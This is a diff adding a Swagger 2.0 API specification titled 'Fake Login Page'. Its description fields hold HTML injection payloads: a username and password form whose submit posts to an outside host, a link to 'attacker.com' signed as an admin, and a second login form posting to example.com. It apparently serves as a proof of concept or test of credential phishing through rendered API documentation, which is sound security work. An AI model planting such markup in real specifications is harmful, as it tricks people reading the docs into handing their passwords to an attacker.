@@ -1,0 +1,57 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: '
+ <form method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default" formaction=//google.com>Login</button>
+            </div>
+        </form>
+ <a href="//attacker.com">here</a><p>Regards</p><p>Invoiced Admin</p> '
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/accounts/groupid/{id}':
+    delete:
+      parameters:
+        - description: 
+           '<form action="https://example.com" method="post">
+  <div>
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username" required>
+  </div>
+  <div>
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required>
+  </div>
+  <div>
+    <input type="submit" value="Login">
+  </div>
+</form>'
+
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
